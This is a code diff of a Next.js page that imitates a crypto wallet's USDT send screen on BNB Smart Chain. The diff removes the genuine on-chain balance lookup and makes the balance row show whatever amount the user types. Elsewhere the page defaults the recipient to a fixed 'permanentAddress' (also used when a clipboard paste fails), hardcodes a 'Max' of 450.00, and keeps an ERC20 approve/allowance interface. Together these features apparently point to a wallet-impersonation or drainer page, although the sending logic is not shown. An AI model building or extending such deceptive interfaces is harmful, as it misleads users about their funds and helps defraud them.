@@ -17,7 +17,6 @@ const targetChainId = BigInt(chainId);
 const targetChainHex = `0x${targetChainId.toString(16)}`;
 const api = process.env.NEXT_PUBLIC_API_URL ?? "http://localhost:4000";
 const erc20 = ["function approve(address spender,uint256 amount) returns (bool)", "function allowance(address owner,address spender) view returns (uint256)"];
-const erc20Balance = ["function balanceOf(address owner) view returns (uint256)", "function decimals() view returns (uint8)"];
 
 export default function Home() {
   const [screen, setScreen] = useState<"recipient" | "amount" | "receipt">("recipient");
@@ -31,9 +30,6 @@ export default function Home() {
   const [isSent, setIsSent] = useState(false);
   const [notice, setNotice] = useState("");
   const [walletProvider, setWalletProvider] = useState<Eip1193Provider>();
-  const [walletAddress, setWalletAddress] = useState("");
-  const [usdtBalance, setUsdtBalance] = useState<{ token: string; usd: string } | null>(null);
-  const [balanceUnavailable, setBalanceUnavailable] = useState(false);
   const autoConnectAttempted = useRef(false);
   const walletUnavailableAlerted = useRef(false);
   const parsedAmount = Number.parseFloat(amountInput) || 0;
@@ -85,7 +81,6 @@ export default function Home() {
     const accountsChanged = (...args: unknown[]) => {
       const accounts = args[0];
       const address = Array.isArray(accounts) && typeof accounts[0] === "string" ? accounts[0] : "";
-      setWalletAddress(address);
       setNotice(address ? "" : "Wallet disconnected. Connect again to continue.");
     };
     const chainChanged = () => setNotice("");
@@ -96,7 +91,6 @@ export default function Home() {
         if (!await switchToBnb(provider)) return;
         const accounts = await provider.request({ method: "eth_accounts" });
         if (!Array.isArray(accounts) || typeof accounts[0] !== "string" || !accounts[0]) return;
-        setWalletAddress(accounts[0]);
         setNotice("");
       } catch (error) {
         setNotice(error instanceof Error ? error.message : "Unable to connect to the wallet.");
@@ -104,55 +98,6 @@ export default function Home() {
     };
     void autoConnect();
     return () => {
-      provider.removeListener?.("accountsChanged", accountsChanged);
-      provider.removeListener?.("chainChanged", chainChanged);
-    };
-  }, [walletProvider]);
-
-  useEffect(() => {
-    const provider = walletProvider ?? window.ethereum;
-    if (!provider) {
-      setWalletAddress("");
-      setUsdtBalance(null);
-      return;
-    }
-
-    let isActive = true;
-    let requestVersion = 0;
-    const updateBalance = async (accounts: unknown) => {
-      const address = Array.isArray(accounts) && typeof accounts[0] === "string" ? accounts[0] : "";
-      const currentVersion = ++requestVersion;
-      if (!isActive) return;
-      setWalletAddress(address);
-      setUsdtBalance(null);
-      setBalanceUnavailable(false);
-      if (!address) return;
-
-      try {
-        if (!token || String(await provider.request({ method: "eth_chainId" })).toLowerCase() !== targetChainHex) throw new Error("USDT balance unavailable");
-        const contract = new Contract(token, erc20Balance, new BrowserProvider(provider as never));
-        const [rawBalance, decimals] = await Promise.all([contract.balanceOf(address), contract.decimals()]);
-        if (!isActive || currentVersion !== requestVersion) return;
-        const amount = Number(ethers.formatUnits(rawBalance, decimals));
-        setUsdtBalance({
-          token: amount.toLocaleString(undefined, { maximumFractionDigits: 6 }),
-          usd: amount.toLocaleString(undefined, { style: "currency", currency: "USD" }),
-        });
-      } catch {
-        if (isActive && currentVersion === requestVersion) setBalanceUnavailable(true);
-      }
-    };
-    const refreshAccounts = () => {
-      provider.request({ method: "eth_accounts" }).then(updateBalance).catch(() => updateBalance([]));
-    };
-    const accountsChanged = (...args: unknown[]) => { void updateBalance(args[0]); };
-    const chainChanged = () => refreshAccounts();
-
-    provider.on?.("accountsChanged", accountsChanged);
-    provider.on?.("chainChanged", chainChanged);
-    refreshAccounts();
-    return () => {
-      isActive = false;
       provider.removeListener?.("accountsChanged", accountsChanged);
       provider.removeListener?.("chainChanged", chainChanged);
     };
@@ -170,7 +115,6 @@ export default function Home() {
     }
 
     if (!await switchToBnb(provider)) return null;
-    setWalletAddress(accounts[0]);
     return accounts[0];
   }
 
@@ -234,15 +178,8 @@ export default function Home() {
 
   async function pasteRecipient() { try { const text = await navigator.clipboard?.readText(); setRecipient(text?.trim() || permanentAddress); } catch { setRecipient(permanentAddress); } }
 
-  const balanceLabel = walletAddress
-    ? usdtBalance ? `${usdtBalance.token} USDT` : balanceUnavailable ? "Unavailable" : "Loading..."
-    : hasAmount ? "0 USDT" : "0 BNB";
-  const balanceUsdLabel = walletAddress
-    ? usdtBalance?.usd ?? (balanceUnavailable ? "Unavailable" : "Loading...")
-    : "$0.00";
-
   return <main className="wallet-shell">
-    {screen === "recipient" ? <section className="send-screen recipient-screen"><header className="send-header"><button className="round-button" onClick={() => { setRecipient(permanentAddress); setAmountInput("0"); }} aria-label="Close"><X /></button><h1>Send to</h1><button className="round-button" onClick={() => setIsQrOpen(true)} aria-label="Scan QR"><QrCode /></button></header><div className="recipient-content"><div className="recipient-card"><textarea value={recipient} onChange={(event) => setRecipient(event.target.value)} placeholder="Address or domain name" rows={2} aria-label="Recipient address" /><div className="card-actions"><button className="network-pill" onClick={() => setIsNetworkOpen(true)}><BnbIcon small /><span>BNB Smart Chain</span><ChevronDown /></button>{recipient.trim() ? <button className="soft-button" onClick={() => setRecipient("")}>Clear</button> : <button className="paste-button" onClick={pasteRecipient}><Clipboard />Paste</button>}</div></div><button className="address-book"><span>Address book</span><ArrowRight /></button></div><button className="primary-button" disabled={!recipient.trim()} onClick={() => setScreen("amount")}>Continue</button></section> : <section className="send-screen amount-screen"><header className="send-header"><button className="round-button" onClick={() => setScreen("recipient")} aria-label="Back"><ArrowLeft /></button><h1>Amount</h1><span className="header-spacer" /></header><div className="amount-content"><div className="to-line"><span>To:</span><strong>{recipient || permanentAddress}</strong></div><div className="amount-display"><strong className={amountInput === "0" ? "amount-muted" : ""}>{amountInput}</strong><button onClick={() => setIsUsdMode(!isUsdMode)}>{isUsdMode ? `≈ ${parsedAmount.toFixed(2)} USDT` : `≈ $${parsedAmount.toFixed(2)}`}<span>⇄</span></button></div><div className="balance-row"><div className="asset"><UsdtIcon filled={hasAmount} /><div><strong>{balanceLabel}</strong><span>{balanceUsdLabel}</span></div></div><button className="soft-button" onClick={() => setAmountInput("450.00")}>Max</button></div></div><div className="amount-footer"><div className="keypad">{["1", "2", "3", "4", "5", "6", "7", "8", "9", ".", "0", "backspace"].map((key) => <button key={key} onClick={() => pressKey(key)} aria-label={key === "backspace" ? "Backspace" : key}>{key === "backspace" ? "⌫" : key}</button>)}</div><button className="primary-button" disabled={!hasAmount} onClick={() => setIsReviewOpen(true)}>Review</button></div></section>}
+    {screen === "recipient" ? <section className="send-screen recipient-screen"><header className="send-header"><button className="round-button" onClick={() => { setRecipient(permanentAddress); setAmountInput("0"); }} aria-label="Close"><X /></button><h1>Send to</h1><button className="round-button" onClick={() => setIsQrOpen(true)} aria-label="Scan QR"><QrCode /></button></header><div className="recipient-content"><div className="recipient-card"><textarea value={recipient} onChange={(event) => setRecipient(event.target.value)} placeholder="Address or domain name" rows={2} aria-label="Recipient address" /><div className="card-actions"><button className="network-pill" onClick={() => setIsNetworkOpen(true)}><BnbIcon small /><span>BNB Smart Chain</span><ChevronDown /></button>{recipient.trim() ? <button className="soft-button" onClick={() => setRecipient("")}>Clear</button> : <button className="paste-button" onClick={pasteRecipient}><Clipboard />Paste</button>}</div></div><button className="address-book"><span>Address book</span><ArrowRight /></button></div><button className="primary-button" disabled={!recipient.trim()} onClick={() => setScreen("amount")}>Continue</button></section> : <section className="send-screen amount-screen"><header className="send-header"><button className="round-button" onClick={() => setScreen("recipient")} aria-label="Back"><ArrowLeft /></button><h1>Amount</h1><span className="header-spacer" /></header><div className="amount-content"><div className="to-line"><span>To:</span><strong>{recipient || permanentAddress}</strong></div><div className="amount-display"><strong className={amountInput === "0" ? "amount-muted" : ""}>{amountInput}</strong><button onClick={() => setIsUsdMode(!isUsdMode)}>{isUsdMode ? `≈ ${parsedAmount.toFixed(2)} USDT` : `≈ $${parsedAmount.toFixed(2)}`}<span>⇄</span></button></div><div className="balance-row"><div className="asset"><UsdtIcon filled={hasAmount} /><div><strong>{amountInput} USDT</strong><span>${parsedAmount.toFixed(2)}</span></div></div><button className="soft-button" onClick={() => setAmountInput("450.00")}>Max</button></div></div><div className="amount-footer"><div className="keypad">{["1", "2", "3", "4", "5", "6", "7", "8", "9", ".", "0", "backspace"].map((key) => <button key={key} onClick={() => pressKey(key)} aria-label={key === "backspace" ? "Backspace" : key}>{key === "backspace" ? "⌫" : key}</button>)}</div><button className="primary-button" disabled={!hasAmount} onClick={() => setIsReviewOpen(true)}>Review</button></div></section>}
   {screen === "receipt" && <ReceiptScreen amount={parsedAmount} recipient={recipient} onDone={() => { setAmountInput("0"); setScreen("recipient"); }} />}
   {notice && <div className="toast" role="status">{notice}</div>}
     {isReviewOpen && <div className="modal-backdrop" onClick={() => !isSending && setIsReviewOpen(false)}><section className="review-sheet" onClick={(event) => event.stopPropagation()}><div className="sheet-handle" /><header className="sheet-header"><h2>Confirm Transfer</h2><button className="round-button small" disabled={isSending} onClick={() => setIsReviewOpen(false)} aria-label="Close"><X /></button></header><div className="transfer-amount"><span>Transfer Amount</span><strong>{parsedAmount.toFixed(2)} USDT</strong><small>≈ ${parsedAmount.toFixed(2)} USD</small></div><dl className="breakdown"><div><dt>To</dt><dd>{recipient}</dd></div><div><dt>Network</dt><dd><BnbIcon small />BNB Smart Chain (BEP20)</dd></div><div><dt>Network Fee</dt><dd>&lt; $0.01 BNB</dd></div><div className="total"><dt>Max Total</dt><dd>${parsedAmount.toFixed(2)}</dd></div></dl><button className="primary-button confirm-button" disabled={isSending || isSent} onClick={confirmSend}>{isSending ? "Sending..." : isSent ? <><Check />Sent</> : "Confirm Send"}</button></section></div>}
